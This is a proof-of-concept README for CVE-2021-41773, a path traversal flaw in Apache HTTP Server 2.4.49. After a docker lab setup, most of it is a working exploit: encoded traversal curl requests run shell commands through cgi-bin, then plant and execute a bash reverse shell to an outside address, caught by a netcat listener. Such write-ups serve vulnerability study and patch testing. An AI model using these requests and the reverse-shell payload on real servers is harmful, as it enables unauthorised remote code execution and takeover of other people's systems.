# CVE-2021-41773
## üêõ Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49
A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.

If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.

This issue is known to be exploited in the wild.

This issue only affects Apache 2.4.49 and not earlier versions.

## Proof Of Concept

### Set up the PoC environment

```
$ docker-compose build
$ docker-compose up
```

### Confirm it works

```
$ curl http://localhost:1234
<html><body><h1>It works!</h1></body></html>
```

### Exploit

#### 1. RCE : Let's see if we actually have access to command, say ``id``.

````bash
$ curl 'http://localhost:1234/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type:text/plain; echo; id'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
````

#### 2. Reverse shell
We will test a reverse shell by creating a bash file on the victim's server. Let's take as an example the reverse shell in bash found on the [PayloadsAllTheThings](https://github.com/LudovicPatho/PayloadsAllTheThings/) repo.  

Here is an example :  
[``bash -i >& /dev/tcp/10.0.0.1/4242 0>&1``](https://github.com/LudovicPatho/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)   
*Don't forget to replace the ip 10.0.0.1 and the port 4242*

Let's create the file ``vuln.sh`` in the /tmp/ folder !
````bash
$  curl 'http://127.0.0.1:1234/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type:
text/plain; echo; echo "#!/bin/bash\nbash -i >& /dev/tcp/192.168.1.12/44 0>&1" > /tmp/vuln.sh'
````

You can check the contents of the file with the ``cat`` command
````bash
$ curl 'http://127.0.0.1:1234/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type:
text/plain; echo; cat /tmp/vuln.sh'
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.12/44 0>&1
````
#### 3. Listener with netcat
Let's create the listener on the local machine.
````bash
$ nc -lvnp 44
````
All that remains is to execute the remote file.
````bash
$ curl 'http://127.0.0.1:1234/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type:
text/plain; echo; bash /tmp/vuln.sh'
````
And that's it.
